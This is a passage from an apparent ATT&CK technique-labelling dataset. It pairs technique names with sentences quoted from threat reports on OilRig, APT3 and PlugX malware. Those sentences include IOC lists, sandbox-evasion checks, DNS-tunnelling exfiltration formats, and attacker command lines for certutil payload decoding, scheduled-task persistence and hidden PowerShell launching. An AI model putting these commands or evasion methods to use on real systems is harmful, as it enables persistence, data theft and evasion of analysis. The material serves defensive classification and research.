      "IOCs  Filename / Domain / IP Address  MD5 Hash or Description  CVE-2017-11882 exploit document  A0E6933F4E0497269620F44A083B2ED4  b.txt  9267D057C065EA7448ACA1511C6F29C7  v.txt/v.vbs  B2D13A336A3EB7BD27612BE7D4E334DF  dUpdateCheckers.base  4A7290A279E6F2329EDD0615178A11FF  hUpdateCheckers.base  841CE6475F271F86D0B5188E4F8BC6DB  cUpdateCheckers.bat  52CA9A7424B3CC34099AD218623A0979  dUpdateCheckers.ps1  BBDE33F5709CB1452AB941C08ACC775E  hUpdateCheckers.ps1  247B2A9FCBA6E9EC29ED818948939702  GoogleUpdateschecker.vbs  C87B0B711F60132235D7440ADD0360B0  hxxp://mumbai-m[.]site  POWRUNER C2  hxxp://dns-update[.]club  Malware Staging Server  CVE-2017-0199 exploit document  63D66D99E46FB93676A4F475A65566D8  94.23.172.164:80  Malware Staging Server  dupdatechecker.doc  D85818E82A6E64CA185EDFDDBA2D1B76  dupdatechecker.exe  C9F16F0BE8C77F0170B9B6CE876ED7FB  proxycheker[.]pro  C2  46.105.221.247  Has resolved mumbai-m[.]site & hpserver[.]online  148.251.55.110  Has resolved mumbai-m[.]site and dns-update[.]club  185.15.247.147  Has resolved dns-update[.]club  145.239.33.100  Has resolved dns-update[.]club  82.102.14.219  Has resolved ns2.dns-update[.]club & hpserver[.]online & anyportals[.]com  v7-hpserver.online.hta  E6AC6F18256C4DDE5BF06A9191562F82  dUpdateCheckers.base  3C63BFF9EC0A340E0727E5683466F435  hUpdateCheckers.base  EEB0FF0D8841C2EBE643FE328B6D9EF5  cUpdateCheckers.bat  FB464C365B94B03826E67EABE4BF9165  dUpdateCheckers.ps1  635ED85BFCAAB7208A8B5C730D3D0A8C  hUpdateCheckers.ps1  13B338C47C52DE3ED0B68E1CB7876AD2  googleupdateschecker.vbs  DBFEA6154D4F9D7209C1875B2D5D70D5  hpserver[.]online  C2  v7-anyportals.hta  EAF3448808481FB1FDBB675BC5EA24DE  dUpdateCheckers.base  42449DD79EA7D2B5B6482B6F0D493498  hUpdateCheckers.base  A3FCB4D23C3153DD42AC124B112F1BAE  dUpdateCheckers.ps1  EE1C482C41738AAA5964730DCBAB5DFF  hUpdateCheckers.ps1  E516C3A3247AF2F2323291A670086A8F  anyportals[.]com  C2"
    ]
  },
  "virtualization/sandbox evasion: system checks": [
    "The specific sandbox checks include:  Using WMI to check BIOS version (SMBIOSBIOSVERSION) for VBOX, bochs, qemu, virtualbox and vm",
    "Mouse Pointer Check The Trojan will perform the following WMI query: \u00a0 Select * from Win32_PointingDevice \u00a0 The Trojan will check the Caption, Description, HardwareType, InfSection, Manufacturer and Name fields in the results for the string VMware, Virtual, VBox, VM or Oracle",
    "Hard Disk Check The Trojan will perform the following WMI query: \u00a0 Select * from Win32_DiskDrive \u00a0 The Trojan will check the Caption and Model fields in the results for the strings Virtual, VMWare, VM, VBox or Oracle",
    "Motherboard Check The Trojan will perform the following WMI query: \u00a0 Select * from Win32_BaseBoard \u00a0 The Trojan will check the Manufacturer and Product fields in the results for the strings VMware, Virtual, VBox, VM or Oracle",
    "VMware DLL Check The Trojan checks to see if the files vmGuestLib.dll or vmbusres.dll exist in the system directory",
    "The OopsIE payload checks to see if the result of this query as more than 0 elements to determine if it is running on a virtual machine",
    "ShellTea utilizes a number of techniques to identify if it is running within a virtual environment or is being monitored.",
    "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)"
  ],
  "audio capture standard application layer protocol exfiltration over command and control channel fallback channels-multi": {
    "technique_names": [
      "audio capture",
      "application layer protocol",
      "exfiltration over c2 channel",
      "fallback channels"
    ],
    "sentances": [
      "The payload has a function it calls early on that tests to see which DNS query types are able to successfully reach the C2 server.\u00a0 It iterates through a list of types and the first DNS type to receive a response from the C2 server will be used for all communications between the payload and the C2 server, which are in the following order (editor\u2019s note: AC is not a\u00a0 DNS record type but is a mode where the trojan will perform a request for an A record requiring ac as a subdomain):  A AAAA AC \u2013 (see note above) CNAME MX TXT SRV SOA  The payload uses the built-in Windows nslookup application with specific parameters and specially crafted subdomains to communicate with the C2"
    ]
  },
  "system owner/user discovery system network configuration discovery-multi": {
    "technique_names": [
      "system owner/user discovery",
      "system network configuration discovery"
    ],
    "sentances": [
      "The information gathered is added to a string in the following structure: <IP address>|<computer name>|<domain>|<username>|<isAdmin flag>|<hasGarbage flag from config>|<hasStartup flag from config>|<\u201chybrid\u201d mode flag from config>|<sleep interval from config>|<jitter value from config> The payload will base64 encode this string and use its DNS tunneling protocol to transmit the data to the C2"
    ]
  },
  "standard application layer protocol uncommonly used port fallback channels-multi": {
    "technique_names": [
      "application layer protocol",
      "non-standard port",
      "fallback channels",
      "non-standard port"
    ],
    "sentances": [
      "We are not sure if this works, but the command name would suggest it is meant to take a screenshot   $command Runs a PowerShell command and sends the output to the C2   slp:\\d+ Sets the sleep interval between C2 beacons   $testmode Issues DNS queries of A, AAAA, AC, CNAME, MX, TXT, SRV and SOA types to the C2 servers attempting to determine which DNS query types were successful"
    ]
  },
  "windows management instrumentation virtualization/sandbox evasion-multi": {
    "technique_names": [
      "windows management instrumentation",
      "virtualization/sandbox evasion: system checks"
    ],
    "sentances": [
      "First, we had not seen the CPU fan check used before, and upon testing the WMI query in a VMware Windows 7 virtual machine we saw no result, as seen in Figure 1  Figure 1 WMI query for the Win32_Fan class on a VM returning no statistics However, when we ran the same query in a physical system running Windows 7, we saw the contents of the Win32_Fan class, as seen in Figure 2"
    ]
  },
  "system owner/user discovery uncommonly used port fallback channels-multi": {
    "technique_names": [
      "system owner/user discovery",
      "non-standard port",
      "fallback channels",
      "non-standard port"
    ],
    "sentances": [
      "The C2 communications begins with a beacon to the following URL: hxxp://www.windowspatch[.]com/khc?<hex(STDOUT of whoami command)> If the C2 server wishes to send a command, it will respond to the beacon above by echoing the whoami command results sent by the Trojan to the C2 in the URL"
    ]
  },
  "disabling security tools obfuscated files or information-multi": {
    "technique_names": [
      "impair defenses: disable or modify tools",
      "obfuscated files or information"
    ],
    "sentances": [
      "We found two obfuscation techniques applied to the script: the first one changing the representation of variables; the second one changing the representation of strings in the script",
      "Building a client    Build configuration Usage scenario Description     Debug configuration Testing The pre-defined Settings.cs will be used, so edit this file before compiling the client"
    ]
  },
  "scheduled task command-line interface scripting registry run keys / startup folder-multi": {
    "technique_names": [
      "scheduled task/job",
      "command and scripting interpreter",
      "command and scripting interpreter",
      "boot or logon autostart execution: registry run keys / startup folder"
    ],
    "sentances": [
      "Office365DCOMCheck.vbs or SystemDiskClean.vbs) within the %TEMP% folder:       CreateObject(\"WScript.Shell\").Run \"\" & WScript.Arguments(0) & \"\", 0, False     The scheduled task will then run every five minutes, which provides persistent execution of the downloader script"
    ]
  },
  "masquerading query registry-multi": {
    "technique_names": ["masquerading", "query registry"],
    "sentances": [
      "Office365DCOMCheck.ps1 and SystemDiskClean.ps1):       wscript.exe \"Office365DCOMCheck.vbs\" \\\"PowerShell.exe\u00a0\u00a0-ExecutionPolicy bypass -WindowStyle hidden -NoProfile '<current PowerShell script>'\u00a0\u00a0\\\"     After setting up persistent access, the payload checks to see if a value exists within a registry key in the HKCU hive whose name is the same as the scheduled task (ex"
    ]
  },
  "standard application layer protocol exfiltration over command and control channel fallback channels-multi": {
    "technique_names": [
      "application layer protocol",
      "exfiltration over c2 channel",
      "fallback channels"
    ],
    "sentances": [
      "The script will first attempt to communicate with the C2 server using HTTPS (HTTP if unsuccessful), which involves GET requests using the session ID within the request\u2019s cookie in the PHPSESSID field, as seen in the example GET request:       GET / HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246Host: www.rdppath[.]comCookie: PHPSESSID=<c2 provided session id>Connection: Keep-Alive     If the payload is unable to reach the C2 via HTTPS/HTTP, the payload yet again falls back to DNS tunneling"
    ]
  },
  "custom cryptographic protocol deobfuscate/decode files or information data encoding-multi": {
    "technique_names": [
      "encrypted channel",
      "deobfuscate/decode files or information",
      "data encoding"
    ],
    "sentances": [
      "The data field within the message is a string of custom base64 encoded data that the malware decodes using the same custom base64 routine mentioned earlier and decrypts it using AES and the pre-shared key"
    ]
  },
  "standard application layer protocol custom cryptographic protocol exfiltration over alternative protocol fallback channels-multi": {
    "technique_names": [
      "application layer protocol",
      "encrypted channel",
      "exfiltration over alternative protocol",
      "fallback channels"
    ],
    "sentances": [
      "If that fails, the payload will use DNS tunneling by first issuing a DNS query to resolve the following domain to notify the C2 that the payload will send data to it in subsequent DNS queries: \u00a0 ns1.<random number between 100000 and 999999>.<c2 name> \u00a0 The payload will then split the message up into 60-byte chunks (only 1 in this case), which it will send to the C2 via DNS queries to resolve domains structured as: \u00a0 <encoded/encrypted data of message>.<same random number between 100000 and 999999>.<c2 name> \u00a0 The payload will notify the C2 that it is done sending data by issuing a DNS query to resolve a domain structured as: \u00a0 ns2.<same random number between 100000 and 999999>.<c2 name> \u00a0 Package Comparison of the QUADAGENT Samples The bat2exe version (SHA256: 5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63)has a batch script, PowerShell script, and associated file names embedded within several resources that it will decrypt using RC4 and various MD5 hashes for keys"
    ]
  },
  "deobfuscate/decode files or information file and directory discovery user execution-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "file and directory discovery",
      "user execution"
    ],
    "sentances": [
      "When macros are enabled and run, the macro within the Word document searches the sections of the document to get the contents of the header using the following piece of code:       Set rng = ActiveDocument.Sections(intSection).Headers(1).Range     The code above obtains the contents of the header, which the macro will write to a file at C:\\programdata\\Office365DCOMCheck.ps1"
    ]
  },
  "deobfuscate/decode files or information masquerading-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "masquerading"
    ],
    "sentances": [
      "The SecurityAssist task is responsible for running the following command line command that uses the Certutil application to decode the base64 encoded data in Base.txt and saves the decoded data to the file %PROGRAMDATA%\\IntelSecurityAssistManager.exe:cmd.exe /c Certutil -decode %appdata%\\Base.txt %programdata%\\IntelSecurityAssistManager.exe & SchTasks /Delete /F /TN SecurityAssist The macro also creates a second scheduled task named Conhost that waits two minutes and runs a VBScript %APPDATA%\\chkSrv.vbs"
    ]
  },
  "scheduled task file deletion-multi": {
    "technique_names": [
      "scheduled task/job",
      "indicator removal on host: file deletion"
    ],
    "sentances": [
      "The macro saves the chkSrv.vbs script to the system, which is responsible for running the IntelSecurityAssistManager.exe payload (OopsIE Trojan) and cleaning up the installation by deleting the two scheduled tasks, the Base.txt file, the ThreeDollars document, and the chkSrv.vbs script"
    ]
  },
  "software packing obfuscated files or information-multi": {
    "technique_names": [
      "obfuscated files or information: software packing",
      "obfuscated files or information"
    ],
    "sentances": [
      "OopsIE Trojan Analysis The OopsIE Trojan delivered in these attacks is packed with SmartAssembly and further obfuscated with ConfuserEx v1.0.0",
      "The resulting Interop.SHDocVw .NET assembly is packed with SmartAssembly and further obfuscated using Confuser v1.9.0.0"
    ]
  },
  "standard application layer protocol scheduled task-multi": {
    "technique_names": ["application layer protocol", "scheduled task/job"],
    "sentances": [
      "Finally, the Trojan creates a scheduled task to run itself every three minutes by running the following command on the command prompt after replacing the %path% string with the path to the srvResesponded.vbs VBScript:SchTasks /Create /SC MINUTE /MO 3 /TN \u201cInetlSecurityAssistManager\u201d /TR \u201cwscript %path%\u201d /f The Trojan uses HTTP to communicate with its C2 server, specifically using the InternetExplorer application object within an embedded Microsoft .NET Framework assembly called Interop.SHDocVw"
    ]
  },
  "standard application layer protocol custom cryptographic protocol web service exfiltration over command and control channel fallback channels-multi": {
    "technique_names": [
      "application layer protocol",
      "encrypted channel",
      "web service",
      "exfiltration over c2 channel",
      "fallback channels"
    ],
    "sentances": [
      "The OopsIE Trojan is configured to use a C2 server hosted at:www.msoffice365cdn[.]com The Trojan will construct specific URLs to communicate with the C2 server and parses the C2 server\u2019s response looking for content within the tags <pre> and </pre>"
    ]
  },
  "standard application layer protocol custom cryptographic protocol exfiltration over command and control channel uncommonly used port data encoding fallback channels-multi": {
    "technique_names": [
      "application layer protocol",
      "encrypted channel",
      "exfiltration over c2 channel",
      "non-standard port",
      "data encoding",
      "fallback channels",
      "non-standard port"
    ],
    "sentances": [
      "If the C2 server provides the appropriate echoed data in the response, the Trojan attempts to determine what\u00a0 commands the C2 wishes to run by issuing a request to the following URL:http://<c2 domain>/what?<hex(Environment.UserName/Environment.MachineName)> After issuing the what command, the Trojan will parse the C2\u2019s response for the string Oops, which the Trojan will treat as the C2 making a mistake and will exit"
    ]
  },
  "timestomp system network configuration discovery command-line interface remote file copy-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "system network configuration discovery",
      "command and scripting interpreter",
      "ingress tool transfer"
    ],
    "sentances": [
      "Otherwise, the Server will respond with a command followed by a set of parameters, split up by the delimiter <>:[command]<>[parameters for command in hexadecimal format] The available commands are: Command Description 1 Run command 2 Upload a file 3 Download a specified file \u00a0 The parameters for each command are issued in hexadecimal format"
    ]
  },
  "timestomp file deletion remote file copy-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "indicator removal on host: file deletion",
      "ingress tool transfer"
    ],
    "sentances": [
      "If the file does not exist, the Trojan will send the C2 server a message < File Not Found > by sending the following URL:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(\u201c< File Not Found >\u201d)> If the file exists, the Trojan will read the contents of the specified file and compresses the contents using the GZipStream class"
    ]
  },
  "custom cryptographic protocol file deletion data staged exfiltration over command and control channel exfiltration over alternative protocol data encrypted-multi": {
    "technique_names": [
      "encrypted channel",
      "indicator removal on host: file deletion",
      "data staged",
      "exfiltration over c2 channel",
      "exfiltration over alternative protocol",
      "data encrypted for impact"
    ],
    "sentances": [
      "The Trojan then gets the hexadecimal values of the compressed data and will replace the following hexadecimal values on each line with ASCII characters to further compressed the data: \u00a0 String of hexadecimal values Character replacement 000000 z 00000 x 0000 y 000 g 00 w 01 t \u00a0 The Trojan then writes 1500 bytes of the hexadecimal formatted data, one per line to a temporary file in the SpecialFolder.CommonApplicationData folder named as:<day><hour><second><millisecond>.tmp The Trojan will then read each line from this temporary file and send them to the C2 server by issuing requests to a URL structured as follows:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>ABZ<hex(1500 characters of hexadecimal formatted file contents)> Once all of the lines of hexadecimal formatted data in the temporary file are sent to the C2 server, the Trojan will send a request to the C2 server to notify the data has been successfully transmitted via a URL structured as follows:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>ABZFinish \u00a0Overlaps with Previous OilRig Group Attacks Since May 2016, we have continued to monitor and uncover various attacks and tools associated with the OilRig group"
    ]
  },
  "file and directory discovery pass the hash-multi": {
    "technique_names": [
      "file and directory discovery",
      "use alternate authentication material: pass the hash"
    ],
    "sentances": [
      "These files have the following metadata: doc.exe (x86): MD5\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 492a839a3bf9c61b7065589a18c5aa8d Size\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 12288 bytes Import Hash\u00a0\u00a0 9342d18e7d315117f23db7553d59a9d1 doc.exe (x64): MD5\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 744a17a3bc6dbd535f568ef1e87d8b9a Size\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 13824 bytes Compile Time\u00a0 2014-11-19 08:25:45Z Import Hash\u00a0\u00a0 2fab77a3ff40e4f6d9b5b7e813c618e4 test.exe: MD5\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 5c08957f05377004376e6a622406f9aa Size\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 11264 bytes Compile Time\u00a0 2014-11-18 10:49:23Z Import Hash\u00a0\u00a0 f34d5f2d4577ed6d9ceec516c1f5a744 These payload files also have interesting PDB debug strings"
    ]
  },
  "system owner/user discovery masquerading account discovery user execution-multi": {
    "technique_names": [
      "system owner/user discovery",
      "masquerading",
      "account discovery",
      "user execution"
    ],
    "sentances": [
      "install.exe: \u00a0\u00a0\u00a0 c:\\Users\\aa\\Documents\\Visual Studio 2008\\Projects\\MShell\\Release\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \\MShell.pdb doc.exe: \u00a0\u00a0\u00a0 c:\\Users\\aa\\Documents\\Visual Studio 2008\\Projects\\4113\\Release\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \\4113.pdb test.exe: \u00a0\u00a0\u00a0 C:\\Users\\aa\\Documents\\Visual Studio 2010\\Projects\\MyRat\\Client\\Client\u00a0 \u00a0\u00a0\u00a0 \\obj\\x86\\Release\\Client.pdb The most interesting PDB string is the \u201c4113.pdb,\u201d which appears to reference CVE-2014-4113",
      "The file is saved to: C:\\Users\\[Username]\\AppData\\Local\\Temp\\notepad.exe  00 00 04  Content after command ID is written to: C:\\Users\\[Username]\\AppData\\Local\\Temp\\notepad2.exe  00 00 05  The files notepad1.exe and notepad2.exe are concatenated together and written to C:\\Users\\[Username]\\AppData\\Local\\Temp\\newnotepad.exe and executed  00 00 06  The contents of the following file is sent to the server: C:\\Users\\[Username]\\AppData\\Local\\Temp\\note.txt  00 00 07  The string following the command ID is executed using \"cmd /C\" and results are sent to server   Links to APT3 On October 28, we observed APT3 sending out spearphishing messages containing a compressed executable attachment"
    ]
  },
  "system owner/user discovery user execution-multi": {
    "technique_names": ["system owner/user discovery", "user execution"],
    "sentances": [
      "The following commands are supported by the malware:  Command ID  Description  00 00 00  Content after command ID is written to: C:\\Users\\[Username]\\AppData\\Local\\Temp\\notepad1.exe  00 00 01  Deletes the files: C:\\Users\\[Username]\\AppData\\Local\\Temp\\notepad.exe C:\\Users\\[Username]\\AppData\\Local\\Temp\\newnotepad.exe  00 00 02  Malware exits  00 00 03  Malware downloads the URL that follows the command ID"
    ]
  },
  "system network configuration discovery exploitation for privilege escalation-multi": {
    "technique_names": [
      "system network configuration discovery",
      "exploitation for privilege escalation"
    ],
    "sentances": [
      "DOMAIN  FIRST SEEN  LAST SEEN  IP ADDRESS  securitywap.com  2014-11-17  2014-11-20  192.184.60.229  www.securitywap.com  2014-11-17  2014-11-20  192.184.60.229   In addition, the join.playboysplus[.]com exploit and payload delivery site resolves to 104.151.248.173",
      "This IP has hosted other domains used by APT3 in past campaigns:  DOMAIN  FIRST SEEN  LAST SEEN  IP ADDRESS  join.playboysplus[.]com  2014-11-21  2014-11-21  104.151.248.173  walterclean[.]com  2014-11-18  2014-11-20  104.151.248.173  www.walterclean[.]com  2014-11-18  2014-11-20  104.151.248.173   As we discussed in our previous blog detailing\u00a0previous APT3 activity, the walterclean[.]com served as a Plugx/Kaba command and control server"
    ]
  },
  "spearphishing link drive-by compromise-multi": {
    "technique_names": ["phishing: spearphishing link", "drive-by compromise"],
    "sentances": [
      "Victims are targeted by watering hole attacks, and emails with links to malicious websites or with malicious attachments"
    ]
  },
  "process discovery registry run keys / startup folder-multi": {
    "technique_names": [
      "process discovery",
      "boot or logon autostart execution: registry run keys / startup folder"
    ],
    "sentances": [
      "When executed, the .NET Framework wrapper will first check if VMware tools is running in background, this is done via a simple process check, searching for any process named \u201cvmtoolsd.\u201d Provided there are no matching processes running, the malware continues execution, creating a registry entry with the name \u2018MSASCuiLTasks\u2019 in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce for persistence"
    ]
  },
  "system information discovery deobfuscate/decode files or information obfuscated files or information-multi": {
    "technique_names": [
      "system information discovery",
      "deobfuscate/decode files or information",
      "obfuscated files or information"
    ],
    "sentances": [
      "Encrypted Configuration in shellcode The configuration information for the malware, including the C2 information are encrypted in the first shellcode blob and are passed as an argument to the DllMain function of the main PlugX DLL"
    ]
  },
  "masquerading process injection-multi": {
    "technique_names": ["masquerading", "process injection"],
    "sentances": [
      "For example, we can see it will inject itself to one these three processes:  %ProgramFiles(x86)%\\Sophos\\AutoUpdate\\ALUpdate.exe %ProgramFiles(x86)%\\Common Files\\Java\\Java Update\\jusched.exe %ProgramFiles(x86)%\\Common Files\\Adobe\\ARM\\1.0\\armsvc.exe  The attempt to inject itself into a process belonging to antivirus product suite is particularly bold"
    ]
  },
  "spearphishing link standard application layer protocol web service-multi": {
    "technique_names": [
      "phishing: spearphishing link",
      "application layer protocol",
      "web service"
    ],
    "sentances": [
      "In addition to this, the malware queries four PasteBin links to extract the C2 addresses from these links:  https://pastebin[.]com/eSsjmhBG https://pastebin[.]com/PSxQd6qw https://pastebin[.]com/CzjM9qwi https://pastebin[.]com/xHDSxxMD  A full list of the extracted strings from the configuration is given in Appendix D \u2013 Extracted PlugX Strings"
    ]
  },
  "web service input capture-multi": {
    "technique_names": ["web service", "input capture"],
    "sentances": [
      "An example of the content retrieved from Pastebin is given below:       ---- BEGIN SSH2 PUBLIC KEY ----Comment: \"rsa-key\"AAAAB3NzaC1yc2EAAAABJQAAAQEAhLxZe4Qli9xt/WknQK9CDLWubpgknZ0HIHSd8uV/TJvLsRkjpV+U/tMiMxjDwLAHVtNcww2h8bXTtw387M2Iv/mJjQ9Lv3BdNiM3/KvmlpeJZrrFu2n5UC9=DZKSDAAADOECEDFDOCCDEDIDOCIDEDOCHDDZJS=oT+Ps8wD4f0NBUtDdEdXhWp3nxv/mJjQ9Lv3BCFDBd09UZzLrfBO1S0nxrHsxlJ+bPaJE2Q/oxLXTrpeJ6AHyLyeUaBha3q9niJ=---- END SSH2 PUBLIC KEY ----     At first glanced we missed it, but the paste uses the same technique discussed in this Airbus post"
    ]
  },
  "system service discovery standard application layer protocol account discovery exploitation for client execution-multi": {
    "technique_names": [
      "system service discovery",
      "application layer protocol",
      "account discovery",
      "exploitation for client execution"
    ],
    "sentances": [
      "Appendix A \u2013 Related IoCs Directly related: 45.248.84[.]7 172.104.65[.]97    SHA256 Comments   5909c1dcfb3270b2b057513561b2ab1613687a0af0072c51244ff005b113888b PlugX   6804be0689bbfbb180bb384ebc316f50cb87e65553d0c3597d6e9b6b6dd8dd3f PlugX   8ea275eee557037ab6626d15c0107bdcf20b45a8307a0dc3baa85d49acc94331 PlugX   e6020eb997715c4f627b6e6a16947861bce310aa31fcf58448a5beba11626d36 PlugX   4554aa6c2fdd58dfddebdb786c5d23cd6277025ab0355ffb5d8967c3976e8659 PlugX   3817388a983d5ee1604a8eec621b5eb251cb8bdeab9c8591fe5e8c90cd99ed49 CVE-2017-0199   45513f942b217def56a1eac82a4b5edca65ebdd5e36c7a8751bf0350d5ebea39 CVE-2017-0199   64d7d4846c5dd00a7271fe8a83aebe4317d06abad84d44ffd6f42b1004704bd5 PlugX   07d94726a1ae764fa5322531f29fe80f0246dd40b4d052c98f269987a3ee4515 PowerShell PlugX   4622f8357846f7a0bea3ce453bb068b443e21359203dfa2f74301c7a79a408c2 Downloader for PS PlugX ++ MSI PlugX   49baf12f50fec772fdfe56c49005efb306b72a312a7dbdad98066029a191bfaf CVE-2017-0199    https://pastebin[.]com/eSsjmhBG https://pastebin[.]com/PSxQd6qw https://pastebin[.]com/CzjM9qwi https://pastebin[.]com/xHDSxxMD Inferred relation via similar targeting    SHA256 Family   6e5864faf4312bf3787e79e432c1acacf2a699ecb5b797cac56e62ed0a8e965c Idicaf   6b455714664a65e2a4af61b11d141467f4554e215e3ebd02e8f3876d8aa31954 Idicaf   df58962a3a065f1587f543a501d0e3f0ca05ebac51fc35d4bb4669d8eac9d8c1 Idicaf   52fee36c647ca799e21cd75db1f425ccf632b28c27e67b8578ff6dd30ca62af7 Idicaf   90e45c7b3798433199d6d917a4847a409dbdc101b210d9798f8c78ee43abf6d8 Idicaf   5ff788efd079eb2987b03d98e0c8211ac97ae6479274bade36a170b5a396f72b Idicaf   535abe8cd436d6b635c5687db0ae8d47c7c3679e4f5e2b4d629276b41fca0578 Idicaf   ef85896426a0a558ab17346a67f108045d142a2d2a21f7702bfb8be50542726d Idicaf   d41e2bbc8ea10dd7543d5f4cb02983e2b1ad5d47cc3ce5fa95189501c019fdac Idicaf   208bd18054134909e2ad680c0096477c48a58e8754a9439002e6523f71e66d47 PlugX   3e9136f95fa55852993cd15b82fe6ec54f78f34584f7689b512a46f0a22907f2 PlugX   5deab61f83e9afe13a79930eda1bdcb6c867042a1ce0e5c44e4209a60ab3327d PlugX   6500636c29eba70efd3eb3be1d094dfda4ec6cca52ace23d50e98e6b63308fdb PlugX   8e07c7636be935e0a6184db8a85fd8b607e6c48bb07d34d0138432f7c697bc99 PlugX    Domains: kbklxpb.imshop.in serupdate.wicp.net msfcnsoft.com micros0ff.com msfcnsoft.com microsoff.net msffncsi.com A781195.gicp.net upgradsource.com B781195.vicp.net kbklxp.eicp.net Appendix B \u2013 Python Scripts LZNT1 decrypt script, only works with Windows"
    ]
  },
  "process hollowing security software discovery application window discovery file deletion modify registry exploitation for client execution service execution-multi": {
    "technique_names": [
      "process injection: process hollowing",
      "software discovery: security software discovery",
      "application window discovery",
      "indicator removal on host: file deletion",
      "modify registry",
      "exploitation for client execution",
      "system services: service execution"
    ],
    "sentances": [
      "key1 += 3373 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0key2 -= 39779 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dec = ord(c) ^ (((key2 >> 16) & 0xff ^ ((key2 & 0xff ^ (((key1 >> 16) & 0xff ^ (key1 - (key1 >> 8) & 0xff)) - (key1 >> 24) & 0xff)) - (key2 >> 8) & 0xff)) - (key2 >> 24) & 0xff)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0out = out + chr(dec)\u00a0\u00a0\u00a0\u00a0return out     Decoding the C2 addresses from Pastebin:      1234567891011121314151617181920212223242526272829303132333435363738  import structdef decode(buf):\u00a0\u00a0\u00a0\u00a0res = \"\"\u00a0\u00a0\u00a0\u00a0for i in range(0, len(buf) -1, 2):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dl = ord(buf[i + 1])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dl = dl - 0x41\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dl = dl * 0x10\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dl = dl + ord(buf[i])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dl = dl - 0x41\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0res += chr(dl)\u00a0\u00a0\u00a0\u00a0return resdef decode_plugx_pastebin(buf):\u00a0\u00a0\u00a0\u00a0start = buf.find('DZKS')\u00a0\u00a0\u00a0\u00a0if start == -1:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return None\u00a0\u00a0\u00a0\u00a0end = buf.find('DZJS', start + 4)\u00a0\u00a0\u00a0\u00a0if end == -1:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return None\u00a0\u00a0\u00a0\u00a0start += 4\u00a0\u00a0\u00a0\u00a0data = buf[start:end]\u00a0\u00a0\u00a0\u00a0decoded = decode(data)\u00a0\u00a0\u00a0\u00a0connection_type = struct.unpack_from('&lt;H', decoded, 0)[0]\u00a0\u00a0\u00a0\u00a0port = struct.unpack_from('&lt;H', decoded, 2)[0]\u00a0\u00a0\u00a0\u00a0ip = decoded[4:]\u00a0\u00a0\u00a0\u00a0print \"Decoded IP: {}:{}, type: {}\".format(ip, port, connection_type)\u00a0\u00a0\u00a0\u00a0return 